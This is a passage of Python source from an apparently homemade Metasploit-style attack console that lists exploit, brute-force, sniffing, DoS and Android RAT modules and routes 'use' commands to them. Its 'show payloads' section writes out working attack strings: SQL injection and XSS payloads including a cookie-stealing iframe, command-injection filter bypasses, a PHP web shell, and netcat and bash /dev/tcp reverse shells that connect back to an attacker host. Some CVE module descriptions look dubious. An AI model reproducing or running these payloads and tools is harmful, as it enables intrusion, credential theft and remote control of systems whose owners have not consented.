|- """ + color.red + """tools/cve-exploits/cve-2010-2730""" + color.white + """                       10/06/12       Buffer overflow in Microsoft Internet Information Services (IIS) 7.5, when FastCGI is enabled, allows remote attackers to execute arbitrary code via crafted headers in a request.
|- """ + color.red + """tools/cve-exploits/cve-2025-0001""" + color.white + """                       25/01/01       Remote Code Execution in Apache HTTP Server 2.4.54.
|- """ + color.red + """tools/cve-exploits/cve-2025-0006""" + color.white + """                       25/01/01       SQL Injection in MySQL 8.0.28.
|- """ + color.red + """tools/cve-exploits/DocsGPT_0-12-0_RCE""" + color.white + """                  25/04/09       DocsGPT 0.12.0 - Remote Code Execution.
|- """ + color.red + """tools/cve-exploits/cve-2025-0282""" + color.white + """                       25/04/18       Ivanti Connect Secure 22.7R2.5  - Remote Code Execution (RCE).
|- """ + color.red + """tools/cve-exploits/wordpress-depicter-plugin-3-6-1""" + color.white + """     25/05/09       WordPress Depicter Plugin 3.6.1 - SQL Injection.
|- """ + color.red + """tools/cve-exploits/cve_2021_41773_apache_rce""" + color.white + """           25/07/19       This module taregts (rce) vulnerability in Apache HTTP Server version 2.4.49, it abuse a path traversal flaw in the url let attacker to access arbitrary files, under certain, execute arbitrary commands via CGI.
|- """ + color.red + """tools/cve-exploits/cve_2021_42013_apache_bypass_rce""" + color.white + """    25/09/20       This module taregts (rce) vulnerability in Apache HTTP Server version 2.4.49 and 2.4.50, triggered via path traversal and command injection. it is a bypass and upgrade of the cve_2021_41773 vulnerability.
        
You can't run these exploits from here, you need to run them from """,os.getcwd(),"""/tools/cve-exploits/
        
Before running them, see the code, besauce the exploits haves some variables needs t oassigns it!
        """)
    elif scconsole == "search multi":
        print("""
    Exploits                                        When created?        Discrepstion 
       |
_______|
|- """ + color.red + """multi/ssh-login-test""" + color.white + """                                24/01/11       for brute forcing ssh port (If your Internet is slow, that's gonna works slowly!).
|- """ + color.red + """multi/ftp-login-test""" + color.white + """                                24/01/19       for login on port 21 or 20 ftp port.
|- """ + color.red + """multi/shell_reverse_tcp""" + color.white + """                             25/02/06       provides a reverse shell payload that can be used to establish a reverse shell connection.
|- """ + color.red + """multi/Typora_v1-7-4""" + color.white + """                                 24/01/29       Typora v1.7.4 - OS Command Injection.
|- """ + color.red + """multi/os_detector""" + color.white + """                                   25/02/19       try to detect the target OS with the port you typed.
|- """ + color.red + """multi/pop3-pass""" + color.white + """                                     25/02/20       exploits a buffer overflow vulnerability in a POP3 server.
|- """ + color.red + """multi/pop3-brute-force""" + color.white + """                              25/02/21       brute-forcing the pop3 port.
|- """ + color.red + """multi/nmap-version-detection""" + color.white + """                        25/04/04       uses nmap to detect version.
|- """ + color.red + """multi/ble-bypass""" + color.white + """                                    25/04/05       This is a vulnerability in the BLE protocol that allows attackers to bypass security measures and gain unauthorized access to a target system. The exploit involves exploiting a flaw in the encryption used in BLE connections.
|- """ + color.red + """multi/ble-scanner""" + color.white + """                                   25/04/04       scans bluetooths around you (sudo permission needed!).
|- """ + color.red + """multi/cve-2025-0282""" + color.white + """                                 25/04/18       Ivanti Connect Secure 22.7R2.5  - Remote Code Execution (RCE).
|- """ + color.red + """multi/generate_backdoor""" + color.white + """                             25/04/24       This exploit uses scpgenerator to generate a backdoor for you.
|- """ + color.red + """multi/nc-listener""" + color.white + """                                   25/04/25       starts a listener with netcat (netcat reqires!).
|- """ + color.red + """multi/rce_server""" + color.white + """                                    25/07/05       This module is listener for RCE(Remote Command Execution) as server(server means attacker).
|- """ + color.red + """multi/listener""" + color.white + """                                      25/07/10       This module will start a listener.
""")
    elif scconsole == "search osx":
        print("""
    Exploits                                        When created?        Discrepstion
       |
_______|
|- """ + color.red + """osx/ssh-login-test""" + color.white + """                                  24/01/11       for brute forcing ssh port (If your Internet is slow, that's gonna works slowly!).
|- """ + color.red + """osx/ftp-login-test""" + color.white + """                                  24/01/19       for login on port 21 or 20 ftp port.
|- """ + color.red + """osx/kernel_xnu_ip_fragment_privesc""" + color.white + """                  25/02/06       exploits a vulnerability in the Apple kernel that allows privilege escalation through the IP fragmentation feature.
|- """ + color.red + """osx/kernel_xnu_ip_fragment_privesc_2""" + color.white + """                25/02/06       exploits a vulnerability in the Apple kernel that allows privilege escalation through the IP fragmentation feature.
""")
    elif scconsole == "search linux":
        print("""
    Exploits                                        When created?        Discrepstion 
       |
_______|
|- """ + color.red + """linux/ssh-login-test""" + color.white + """                                24/01/11       for brute forcing ssh port (If your Internet is slow, that's gonna works slowly!).
|- """ + color.red + """linux/ftp-login-test""" + color.white + """                                24/01/19       for login on port 21 or 20 ftp port.
|- """ + color.red + """linux/vulnerability-find""" + color.white + """                            25/02/08       find vulnerabilities like common open ports, if the password is weak, the kernal version.
|- """ + color.red + """linux/tcpdump_packet_sniffer""" + color.white + """                        04/04/05       tcpdump - ISAKMP Identification Payload Integer Overflow.
""")
    elif scconsole == "search server":
        print("""
    Exploits                                        When created?        Discrepstion 
       |
_______|
|- """ + color.red + """server/browser_autopwn2""" + color.white + """                             18/02/03        This module exploits a Cross-Site Scripting (XSS) vulnerability to steal user credentials and deliver a phishing email to the user.
|- """ + color.red + """server/extract_table_db_column""" + color.white + """                      25/02/08        extract sensitive information with the payloads have, extract informations like tables, columns, databases.
|- """ + color.red + """server/cve-2025-0001""" + color.white + """                                25/01/01        Remote Code Execution in Apache HTTP Server 2.4.54.
|- """ + color.red + """server/cve-2025-0006""" + color.white + """                                25/01/01        SQL Injection in MySQL 8.0.28.
|- """ + color.red + """server/php-cgi-arg-injection""" + color.white + """                        25/04/16        This exploit exploits a vulnerability in the PHP CGI (Common Gateway Interface) that allows an attacker to execute arbitrary commands on the server.
""")
    elif scconsole == "search dos":
        print("""
    Exploits                                        When created?        Discrepstion 
       |
_______|
|- """ + color.red + """dos/ciscodos""" + color.white + """                                        03/07/22       Remote DoS against the recent Cisco IOS vuln.
|- """ + color.red + """dos/DD_D_Attack""" + color.white + """                                     25/02/01       for DoS and DDoS Attack (If your Internet is slow, that's gonna works slowly!).
|- """ + color.red + """dos/ble-dos""" + color.white + """                                         25/04/05       scans the bluetooths around you and then let you to choose target, trys to connect, then starts the attack.
|- """ + color.red + """dos/Apache_Commons_FileUpload_and_Apache_Tomcat_DoS""" + color.white + """ 25/04/27       Apache Commons FileUpload and Apache Tomcat DoS.
""")
    elif scconsole == "search php":
        print("""
    Exploits                                        When created?        Discrepstion 
       |
_______|
|- """ + color.red + """php/RCE_via_PHP""" + color.white + """                                     25/02/18       This exploit exploits a vulnerability in a PHP application that allows arbitrary code execution on the server.
|- """ + color.red + """php/SOPlanning_1-52-01_RCE""" + color.white + """                          24/11/15       SOPlanning 1.52.01 (Simple Online Planning Tool) - Remote Code Execution (RCE)(Authenticated).
|- """ + color.red + """php/Wp2Fac""" + color.white + """                                          23/09/08       Wp2Fac - OS Command Injection.
|- """ + color.red + """php/POST-request""" + color.white + """                                    25/03/14       aims to upload a PHP file with a command execution payload to a vulnerable upload URL.
|- """ + color.red + """php/WordPress_Core_6-2_Directory_Traversal""" + color.white + """          25/04/27       WordPress Core 6.2 - Directory Traversal.
""")
    elif scconsole == "search auxiliary":
        print("""
    Exploits                                        When created?        Discrepstion 
       |
_______|
|- """ + color.red + """auxiliary/robots_txt""" + color.white + """                                25/02/21       Retrieves and parses robots.txt files.
|- """ + color.red + """auxiliary/dirs_brute""" + color.white + """                                25/02/20       Brute forces directories on web servers.
|- """ + color.red + """auxiliary/http-version""" + color.white + """                              25/02/21       Scans web servers for their HTTP version.
|- """ + color.red + """auxiliary/enum_apache_user""" + color.white + """                          25/02/21       Enumerates Apache users.
|- """ + color.red + """auxiliary/vuln-scan""" + color.white + """                                 25/02/21       Perform a vulnerability scan on a target.
|- """ + color.red + """auxiliary/smtp-version""" + color.white + """                              25/02/22       Scan a target for SMTP vulnerabilities.
|- """ + color.red + """auxiliary/title""" + color.white + """                                     25/02/21       This exploit retrieves the title of the target webpage.
|- """ + color.red + """auxiliary/wordpress-scan""" + color.white + """                            25/01/21       scans the tagret web server to if that running wordpress.
|- """ + color.red + """auxiliary/wordpress-scan""" + color.white + """                            25/01/21       This exploit scans for Wordpress vulnerabilities on the target server.
|- """ + color.red + """auxiliary/drupal-scan""" + color.white + """                               25/02/21       scans the target web server to if that running drupal.
|- """ + color.red + """auxiliary/cookie_stolen""" + color.white + """                             25/02/24       finds cookies on the target website.
|- """ + color.red + """auxiliary/basic-auth""" + color.white + """                                25/02/26       This module attempts to brute force HTTP basic authentication credentials.
|- """ + color.red + """auxiliary/ftp-anonymous""" + color.white + """                             25/02/26       This module attempts to log into an FTP server anonymously.
|- """ + color.red + """auxiliary/http_put""" + color.white + """                                  25/02/26       This module attempts to PUT files on a web server.
|- """ + color.red + """auxiliary/ping-mssql""" + color.white + """                                25/02/27       This module attempts to determine if a Microsoft SQL Server is running on a host.
|- """ + color.red + """auxiliary/webdav_scanner""" + color.white + """                            25/02/27       This module scans for WebDAV servers and their capabilities.
|- """ + color.red + """auxiliary/sitemap-generator""" + color.white + """                         25/02/27       This module generates a sitemap by crawling the target website.
|-- """ + color.red + """auxiliary/password_cracking/crack-zip""" + color.white + """              25/03/15       This module can crack password-protected ZIP files.
|-- """ + color.red + """auxiliary/password_cracking/crack-pdf""" + color.white + """              25/03/15       This module can crack password-protected PDF files.
|-- """ + color.red + """auxiliary/password_cracking/crack-rar""" + color.white + """              25/03/15       This module can crack password-protected RAR files.
|-- """ + color.red + """auxiliary/password_cracking/crack-office""" + color.white + """           25/03/16       This module can crack password-protected Microsoft Office documents.
|-- """ + color.red + """auxiliary/password_cracking/crack-windows-hash""" + color.white + """     25/03/17       This module can crack Windows password hashes using a dictionary attack or brute-force methods.
|- """ + color.red + """auxiliary/pipe_auditor""" + color.white + """                              25/03/18       This module audits named pipes on an SMB server. It can be used to identify potential vulnerabilities or access points.
|- """ + color.red + """auxiliary/smb_enumshares""" + color.white + """                            25/03/18       This module enumerates shares on an SMB server. It can be used to identify potential vulnerabilities or access points.
|- """ + color.red + """auxiliary/web-spider""" + color.white + """                                25/02/20       This module allows you to crawl websites and collect URLs, files, and other resources. It can be used to gather information for reconnaissance and vulnerability assessment.
|- """ + color.red + """auxiliary/apache_mod_status""" + color.white + """                         25/03/20       This module exploits Apache mod_status misconfiguration to obtain sensitive information about the server.
|- """ + color.red + """auxiliary/coldfusion_rce""" + color.white + """                            25/03/20       This module exploits ColdFusion remote command execution vulnerabilities to execute arbitrary commands.
|- """ + color.red + """auxiliary/http-form-brute""" + color.white + """                           25/03/21       This module attempts to brute-force HTTP form logins using a specified list of credentials.
|- """ + color.red + """auxiliary/sqli-xss-vuln""" + color.white + """                             25/04/10       This exploit is for WEB Vulnerabilitie test, to test teh target website to see if it is vulnerable to sqli or xss.
|- """ + color.red + """auxiliary/check-login-vuln""" + color.white + """                          25/04/15       This exploit uses 10 sql injection payloads to find a vulnerabilitie on target login page.
|-- """ + color.red + """auxiliary/password_cracking/crack_password""" + color.white + """         25/04/16       cracks the password hash with the wordlist and hash type you entered(md5, sha1, sha256, ...).
|- """ + color.red + """auxiliary/wordpress-depicter-plugin-3-6-1""" + color.white + """           25/05/09       WordPress Depicter Plugin 3.6.1 - SQL Injection.
|- """ + color.red + """auxiliary/wordpress_core_6-2_Directory-Traversal""" + color.white + """    25/04/22       WordPress Core 6.2 - Directory Traversal.
|- """ + color.red + """auxiliary/sqli-vuln-test""" + color.white + """                            25/05/13       This exploit test the target login page with 20 sql injections and some passwords to find sql injection vulnerabilitie.
|- """ + color.red + """auxiliary/findns""" + color.white + """                                    25/05/18       This exploit find dns server from the domain you entered.
|- """ + color.red + """auxiliary/dnsenum""" + color.white + """                                   25/05/18       This exploit finds all dns records and show them.
|- """ + color.red + """auxiliary/lbdetect""" + color.white + """                                  25/05/20       Trys to detect if there any load balancer in target website.
|- """ + color.red + """auxiliary/base64_decrypt""" + color.white + """                            25/05/20       This Trys to decode the Base64 and shows you the result.
|- """ + color.red + """auxiliary/hashdetect""" + color.white + """                                25/05/23       Try to find the hash type that you give.
|- """ + color.red + """auxiliary/http-bruteforce""" + color.white + """                           25/05/25       Try to brute-force http and show you the result with response and length.
|- """ + color.red + """auxiliary/find-login-fields""" + color.white + """                         25/05/25       Try to detect login form fields and show to you.
|- """ + color.red + """auxiliary/xss_scanner""" + color.white + """                               25/06/08       Test the target url, find a form(like search form or else), then test the xss payloads from the wordlist you give.
|- """ + color.red + """auxiliary/sql-injection-db-tbl-c""" + color.white + """                    25/06/28       Test if there is a sql injection vulnerability, then trys to take out databses, tables, and columns.
|- """ + color.red + """auxiliary/xss_tester""" + color.white + """                                25/06/28       Test some XSS payloads to see if there is any XSS vulnerability.
|- """ + color.red + """auxiliary/ftp_brute_force""" + color.white + """                           25/07/05       This module trys to brute force ftp with the username and password list you specified.
|- """ + color.red + """auxiliary/https_brute_force""" + color.white + """                         25/07/12       This module will try to brute force https login page.
|- """ + color.red + """auxiliary/mikrotik-routeros-7-19-1-xss""" + color.white + """              25/07/16       MikroTik RouterOS 7.19.1 - Reflected XSS.
""")
    elif scconsole == "search sniffer":
        print("""
    Exploits                                        When created?        Discrepstion 
       |
_______|
|- """ + color.red + """sniffer/sniffer""" + color.white + """                                     25/03/13       This module captures network traffic and logs it to a file.
|- """ + color.red + """sniffer/credential-collector""" + color.white + """                        25/03/14       This module collects cleartext credentials, such as passwords, from network traffic.
|- """ + color.red + """sniffer/inspect_traffic""" + color.white + """                             25/03/16       This module analyzes network traffic and identifies potential vulnerabilities.
|- """ + color.red + """sniffer/SSLstrip""" + color.white + """                                    25/03/17       This module performs SSL stripping, which modifies HTTPS traffic to remove encryption and capture cleartext credentials.
|- """ + color.red + """sniffer/tcpdump-sniffer""" + color.white + """                             25/03/18       This module starts a TCPdump sniffer that captures network traffic and saves it to a pcap file. It can be used to capture cleartext credentials and analyze network traffic.
|- """ + color.red + """sniffer/ettercap-sniffer""" + color.white + """                            25/03/18       This module starts a TCPdump sniffer that captures network traffic and saves it to a pcap file. It can be used to capture cleartext credentials and analyze network traffic.
|- """ + color.red + """sniffer/tshark-sniffer""" + color.white + """                              25/03/18       This module starts a tshark sniffer that captures network traffic and saves it to a pcap file. It can be used to capture cleartext credentials and analyze network traffic.
|- """ + color.red + """sniffer/ble-scanner""" + color.white + """                                 25/04/04       scans bluetooths around you (sudo permission needed!).
""")
    elif scconsole == "search scanner":
        print("""
    Exploits                                        When created?        Discrepstion 
       |
_______|
|- """ + color.red + """scanner/portscan-tcp""" + color.white + """                                25/04/08       scans for open ports.
|- """ + color.red + """scanner/ble-scanner""" + color.white + """                                 25/04/04       scans bluetooths around you (sudo permission needed!).
|- """ + color.red + """scanner/vnc-none-auth""" + color.white + """                               25/04/08       scans the VNC port to see if it is open or closed.
|- """ + color.red + """scanner/ftp-anon""" + color.white + """                                    25/04/08       scans target port 21 to if anonymous access is enabled on port 21 (ftp port).
|- """ + color.red + """scanner/portmap-amp""" + color.white + """                                 25/04/08       attempts to connect to a web server at the specified IP address and checks the response for indicators of an AMP stack (Apache, MySQL, PHP).
|- """ + color.red + """scanner/subdomain-scan""" + color.white + """                              25/04/10       This scanner exploits the subdomain scanner to look for specific subdomains by using a wordlist.
|- """ + color.red + """scanner/portscan""" + color.white + """                                    25/04/10       scans the port you specified to see they are open or closed.
|- """ + color.red + """scanner/ping_ip_site""" + color.white + """                                25/04/15       uses ping tool to make sure target or website is reachable.
|- """ + color.red + """scanner/http-options""" + color.white + """                                25/05/01       scan the specified host for the available HTTP methods and print the results.
|- """ + color.red + """scanner/https-options""" + color.white + """                               25/05/01       scan the specified host for the available HTTP methods and print the results.
|- """ + color.red + """scanner/server-scanner""" + color.white + """                              25/05/01       It sends an HTTP GET request to the target URL and retrieves the server headers. If the server header indicates PHP, it extracts the PHP version and returns it.
|- """ + color.red + """scanner/WAF_Checker""" + color.white + """                                 25/07/09       This module will try some payloads and other thinks to find the target WAF(Web Application Firewall) type and version.
|- """ + color.red + """scanner/csrf_token_detect""" + color.white + """                           25/07/12       This module will detect if target using csrf token.
""")
    elif scconsole == "search android":
        print("""
    Exploits                                        When created?        Discrepstion 
       |
_______|
|- """ + color.red + """android/android_reverse_tcp""" + color.white + """                         25/06/02       Creates a RAT file with scRAT tool for an andorid device, then start a listener(but just you need to do is to send the RAT to your target!).
|- """ + color.red + """android/GetShell""" + color.white + """                                    25/06/15       runs a listener with scRAT to get a shell from an android device.
|- """ + color.red + """android/BuildShell""" + color.white + """                                  25/06/15       Creates a apk file to get a shell from an android.
""")
    elif scconsole == "search buffer_overflow":
        print("""
    Exploits                                        When created?        Discrepstion
       |
_______|
|- """ + color.red + """buffer_overflow/fuzzer_basic""" + color.white + """                        25/07/11       Try some bytes and finds a crash.
|- """ + color.red + """buffer_overflow/fuzzer_pattern""" + color.white + """                      25/07/11       Try to send a Pattern.
|- """ + color.red + """buffer_overflow/find_offsec""" + color.white + """                         25/07/11       Try to find offsec.
|- """ + color.red + """buffer_overflow/buffer_overflow_exploit_builder""" + color.white + """     25/07/11       Try to exploit target with crash-byte, offsec you found and your shellcode(generate shellcode with 'scshellcodegenerator' and start a listener to get a shell).
|- """ + color.red + """buffer_overflow/fuzzer""" + color.white + """                              25/07/11       Try some bytes and finds a crash. (you need to config it from : exploits/buffer_overflow/fuzzer.py , line 12 to your target ip and port).
""")
    elif scconsole == "show payloads":
        print("""
""" + color.green + """' OR 1=1--""" + color.white + """   ---> SQL Injection payload.

""" + color.green + """' UNION SELECT NULL,NULL,NULL--""" + color.white + """  ---> SQL Injection union payload.

""" + color.green + """<script>alert('XSS')</script>""" + color.white + """  ---> cross site XSS alert payload.

""" + color.green + """<img src=x onerror=alert('XSS')>""" + color.white + """  ---> cross site XSS onerror payload.

""" + color.green + """; whoami""" + color.white + """  ---> remote code execute whoami payload.

""" + color.green + """; cat /etc/passwd""" + color.white + """  ---> remote code execute cat payload.

""" + color.green + """../../../../etc/passwd""" + color.white + """  ---> directory traversal etc/passwd payload.

""" + color.green + """<?php system($_GET['cmd']); ?>""" + color.white + """  ---> directory traversal php payload.

""" + color.green + """<a href=javascript:alert('XSS')>Click Me</a>""" + color.white + """  ---> cross site XSS Click Me payload.

""" + color.green + """javascript:alert('XSS')""" + color.white + """  ---> cross site XSS javascript payload.

""" + color.green + """shell_reverse_tcp""" + color.white + """ ---> trys to get a reverse shell from target, then connects back to the attacker.

""" + color.green + """UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--""" + color.white + """   ---> SQL Injection union payload.

""" + color.green + """admin' OR 1=1 LIMIT 1--""" + color.white + """   ---> SQL Injection payload.

""" + color.green + """;echo system($_GET["cmd"]);//""" + color.white + """   ---> Command execution payload.

""" + color.green + """reverse_tcp""" + color.white + """ ---> trys to get a reverse shell from target, then connects back to the attacker.

""" + color.green + """bind_tcp""" + color.white + """ ---> trys to get a reverse shell from target, then connects back to the attacker.

""" + color.green + """php_reverse_shell""" + color.white + """ ---> trys to get a reverse shell with php from target, then connects back to the attacker.

""" + color.green + """bash_reverse_shell""" + color.white + """ ---> trys to get a reverse shell with bash from target, then connects back to the attacker.

""" + color.green + """ruby_reverse_shell""" + color.white + """ ---> trys to get a reverse shell from target, then connects back to the attacker.

""" + color.green + """; ping -c 127.0.0.1""" + color.white + """ ---> trys to detect if there is a OS Command Injection vulnerabilitie.

""" + color.green + """; uname -a""" + color.white + """ ---> trys to detect if there is a OS Command Injection vulnerabilitie.

""" + color.green + """; nc [LHOST] [LPORT] -e /bin/bash""" + color.white + """ ---> trys to connect back to the attacker machine after finding OS Command Injection vulnerabilitie.

""" + color.green + """; echo INJECTIONTEST""" + color.white + """ ---> trys to detect if there is a OS Command Injection vulnerabilitie.

""" + color.green + """; id #""" + color.white + """ ---> Bypass filter for OS Command Injection vulnerabilitie.

""" + color.green + """; id //""" + color.white + """ ---> Bypass filter for OS Command Injection vulnerabilitie.

""" + color.green + """'id'""" + color.white + """ ---> Bypass filter for OS Command Injection vulnerabilitie.

""" + color.green + """&& id""" + color.white + """ ---> Bypass filter for OS Command Injection vulnerabilitie.

""" + color.green + """|| id""" + color.white + """ ---> Bypass filter for OS Command Injection vulnerabilitie.

""" + color.green + """$(id)""" + color.white + """ ---> Bypass filter for OS Command Injection vulnerabilitie.

""" + color.green + """; netstat -an""" + color.white + """ ---> Try to see the open ports from OS Command Injection vulnerabilitie.

""" + color.green + """bash -c 'bash -i >& /dev/tcp/[LHOST]/[LPORT] 0>&1'""" + color.white + """ ---> trys to connect back to the attacker machine after finding OS Command Injection vulnerabilitie with bash.

""" + color.green + """' order by [The number you want]""" + color.white + """  ---> SQL Injection number of columns payload.

""" + color.green + """' union select [number of columns (example: 1,2,...)],database() #""" + color.white + """  ---> SQL Injection database name, union payload.

""" + color.green + """' union select [number of columns (example: 1,2,...)],group_concat(table_name) from information_schema.tables where table_schema=database() #""" + color.white + """  ---> SQL Injection tables name, union payload.

""" + color.green + """' union select [number of columns (example: 1,2,...)],group_concat(column_name) from information_schema.columns where table_name='[Table name]' #""" + color.white + """  ---> SQL Injection columns name, union payload.

""" + color.green + """' union select [number of columns (example: 1,2,...)],group_concat([column name], ':', [column name]) from [Table name] #""" + color.white + """  ---> SQL Injection tables name, union payload.

""" + color.green + """<h1> hello </h1>""" + color.white + """  ---> XSS (Persistent) test payload.

""" + color.green + """<script>document.write('<iframe src="http://example.com></iframe>')</script>""" + color.white + """  ---> XSS (Persistent) iframe payload.

""" + color.green + """<script>document.write('<iframe src=\ "http://127.0.0.1/take_cookies.php?cookie=' + document.cookie + '\ " width="0" height="0"> </iframe>')</script>""" + color.white + """  ---> XSS (Persistent) take cookies payload.

""" + color.green + """<script>document.body.innerHTML="<h1>you have been hacked</h1></br></br><img src="https://example.com/image.jpg"></img>"</script>""" + color.white + """  ---> XSS (Persistent) Deface payload.

""" + color.green + """<script>window.location="https://example.com"</script>""" + color.white + """  ---> XSS (Persistent) Redirect payload.

""" + color.green + """' or ''='""" + color.white + """  ---> XPath injection test payload.

""" + color.green + """aa' or substring(name(/*[1]),1,1)='u' and '1'='1""" + color.white + """  ---> XPath injection brute-force node root payload.

""" + color.green + """aa' or substring(name(/*[1]/*[1]),1,1)='u' and '1'='1""" + color.white + """  ---> XPath injection brute-force child payload.

""" + color.green + """' order by [The number you want]""" + color.white + """  ---> AJAX SQL Injection number of columns payload.

""" + color.green + """' union select [number of columns (example: 1,2,...)],database() #""" + color.white + """  ---> AJAX SQL Injection database name, union payload.

""" + color.green + """' union select [number of columns (example: 1,2,...)],group_concat(table_name) from information_schema.tables where table_schema=database() #""" + color.white + """  ---> AJAX SQL Injection tables name, union payload.

""" + color.green + """' union select [number of columns (example: 1,2,...)],group_concat(column_name) from information_schema.columns where table_name='[Table name]' #""" + color.white + """  ---> AJAX SQL Injection columns name, union payload.

""" + color.green + """' union select [number of columns (example: 1,2,...)],group_concat([column name], ':', [column name]) from [Table name] #""" + color.white + """  ---> AJAX SQL Injection tables name, union payload.

""" + color.green + """7ttttttttt'}}); alert(3); //""" + color.white + """  ---> AJAX XSS payload.

""" + color.green + """windows_privilage_escalation""" + color.white + """  ---> windows privilage escalation tester and payloads.

""" + color.green + """rce_client""" + color.white + """  ---> rce(remote command execution) payload, use 'multi/rce_server' as attacker.

""" + color.green + """http://<target-ip>/login?dst=javascript:alert(3)""" + color.white + """  ---> MikroTik RouterOS 7.19.1 (Reflected XSS) - Visit the following URL while connected to the vulnerable MikroTik hotspot service.
""")
    elif scconsole == "db_scscanner -h" or scconsole == "db_scscanner" or scconsole == "db_scscanner ":
        print("""
Usage: db_scscanner [option]

Example Options: 
          db_scscanner -o
          db_scscanner -p
          db_scscanner -w
          db_scscanner -h
          db_scscanner results
          db_scscanner -n-scan

Options:
  -h --->   Display this help message
  -p --->   Scan specific ports on a host
  -o --->   Scan for the operating system of a host from 7,21,22,25,80,443 and 8080 ports
  -w --->   Scan a website for open ports from 1 to 65536
  results --->   Display the scans you done
  -n-scan --->   Normal scan

Arguments:
  [host]               Single host IP address or range (e.g., 10.11.1.0 or 10.11.1.1-254)
  [port]               Single port number or comma-separated list of ports (e.g., 80 or 7,22,80,8080)
  [website]            Website URL (e.g., example.com)

the tool will asks for target IP or URL!

sudo reqired!!
""")
    elif scconsole == "db_scscanner -n-scan":
        targetsip00 = input("Enter taregt IP: ")
        os.system(f'sudo python db_scscanner.py {targetsip00}')
    elif scconsole == "db_scscanner -p":
        targetportsorport = input("Enter the ports or port: ")
        targetip00 = input("Enter Target IP: ")
        os.system(f'sudo python db_scscanner.py -p={targetportsorport} {targetip00}')
    elif scconsole == "db_scscanner -o":
        targetip331 = input("Enter tagret IP: ")
        os.system(f'sudo python db_scscanner.py -o {targetip331}')
    elif scconsole == "db_scscanner -w":
        targeturl441 = input("Enter target URL: ")
        os.system(f'sudo python db_scscanner.py -w {targeturl441}')
    elif scconsole == "db_scscanner results":
        os.system(f'python db_scscanner.py results')
    elif scconsole == "gui" or scconsole == "GUI":
        print("Starting gui ...")
        time.sleep(1)
        print("Started!")
        os.system('sudo python scconsolegui.py')
        print("Exiting from scconsole gui ...")
        time.sleep(1)
    elif scconsole == "use exploit/bypassuac-eventvwr":
        time.sleep(0.5)
        print("using exploit/bypassuac-eventvwr.")
        exploitbypassuaceventvwr()
    elif scconsole == "use exploit/find-vulnerabilites-scan":
        time.sleep(0.5)
        print("using exploit/find-vulnerabilites-scan.")
        exploitfindvulnerabilitesscan()
    elif scconsole == "use exploit/ssh-version":
        time.sleep(0.5)
        print("using exploit/ssh-version.")
        exploitsshversion()
    elif scconsole == "use exploit/reverse-shell":
        time.sleep(0.5)
        print("using exploit/reverse-shell.")
        exploitreverseshell()
    elif scconsole == "use exploit/cve-2023-22518/cve-2023-22518":
        time.sleep(0.5)
        print("using exploit/cve-2023-22518/cve-2023-22518.")
        exploitcve202322518cve202322518()
    elif scconsole == "use exploit/cve-2023-22518/vuln-test-for-cve-2023-22518":
        time.sleep(0.5)
        print("using exploit/cve-2023-22518/vuln-test-for-cve-2023-22518.")
        exploitvulncve202322518cve202322518()
    elif scconsole == "use windows/ssh-login-test":
        time.sleep(0.5)
        print("using windows/ssh-login-test.")
        wexploitsshlogintest()
    elif scconsole == "use windows/java-rhino":
        time.sleep(0.5)
        print("using windows/java-rhino.")
        wexploitjavarhino()
    elif scconsole == "use windows/ms17_010":
        time.sleep(0.5)
        print("using windows/ms17_010.")
        wexploitms17010psexec()
    elif scconsole == "use windows/PDF-exploit":
        time.sleep(0.5)
        print("using windows/PDF-exploit.")
        wexploitPDFexploit()
    elif scconsole == "use windows/ftp-login-test":
        time.sleep(0.5)
        print("using windows/ftp-login-test.")
        wexploitftplogintest()
    elif scconsole == "use windows/7-zip_cve-2025-0411":
        time.sleep(0.5)
        print("using windows/7-zip_cve-2025-0411.")
        w7zipcve20250411()
    elif scconsole == "use site/XSS-SQLi-PHP-PASS":
        time.sleep(0.5)
        print("using site/XSS-SQLi-PHP-PASS.")
        texploitXSS()
    elif scconsole == "use dos/DD_D_Attack":
        time.sleep(0.5)
        print("using dos/DD_D_Attack.")
        texploitDDDAttack()
    elif scconsole == "use site/vuln-curl-website":
        time.sleep(0.5)
        print("using site/vuln-curl-website.")
        texploitfindvulnerabiliteswebsite()
    elif scconsole == "use site/find-vulnerabilites-website2":
        time.sleep(0.5)
        print("using site/find-vulnerabilites-website2.")
        texploitfindvulnerabiliteswebsite2()
    elif scconsole == "use site/http-login-test":
        time.sleep(0.5)
        print("using site/http-login-test.")
        texploithttplogintest()
    elif scconsole == "use site/ZIP-exploit":
        time.sleep(0.5)
        print("using site/ZIP-exploit.")
        texploitZIPexploit()
    elif scconsole == "use site/tomcat-mgr-login":
        time.sleep(0.5)
        print("using site/tomcat-mgr-login.")
        texploittomcatmgrlogin()
    elif scconsole == "use site/Directory-finder":
        time.sleep(0.5)
        print("using site/Directory-finder.")
        tdirectoryfinder()
    elif scconsole == "use site/struts2_namespace_ognl":
        time.sleep(0.5)
        print("using site/struts2_namespace_ognl.")
        tstruts2namespaceognl()
    elif scconsole == "use multi/ssh-login-test":
        time.sleep(0.5)
        print("using multi/ssh-login-test.")
        mexploitsshlogintest()
    elif scconsole == "use multi/ftp-login-test":
        time.sleep(0.5)
        print("using multi/ftp-login-test.")
        mexploitftplogintest()
    elif scconsole == "use multi/shell_reverse_tcp":
        time.sleep(0.5)
        print("using multi/shell_reverse_tcp.")
        mexploitreverseshell()
    elif scconsole == "use osx/kernel_xnu_ip_fragment_privesc":
        time.sleep(0.5)
        print("using osx/kernel_xnu_ip_fragment_privesc.")
        osxkernelxnuipfragmentprivesc()
    elif scconsole == "use osx/kernel_xnu_ip_fragment_privesc_2":
        time.sleep(0.5)
        print("using osx/kernel_xnu_ip_fragment_privesc_2.")
        osxkernelxnuipfragmentprivesc2()
    elif scconsole == "use osx/ssh-login-test":
        time.sleep(0.5)
        print("using osx/ssh-login-test.")
        oexploitsshlogintest()
    elif scconsole == "use osx/ftp-login-test":
        time.sleep(0.5)
        print("using osx/ftp-login-test.")
        oexploitftplogintest()
    elif scconsole == "use linux/ssh-login-test":
        time.sleep(0.5)
        print("using linux/ssh-login-test.")
        lexploitsshlogintest()
    elif scconsole == "use linux/ftp-login-test":
        time.sleep(0.5)
        print("using linux/ftp-login-test.")
        lexploitftplogintest()
    elif scconsole == "use site/reverse_http":
        time.sleep(0.5)
        print("using site/reverse_http.")
        treversehttp()
    elif scconsole == "use server/browser_autopwn2":
        time.sleep(0.5)
        print("using server/browser_autopwn2.")
        sserverbrowserautopwn2()
    elif scconsole == "use server/extract_table_db_column":
        time.sleep(0.5)
        print("using server/extract_table_db_column.")
        sserverextracttabledbcolumn()
    elif scconsole == "use linux/vulnerability-find":
        time.sleep(0.5)
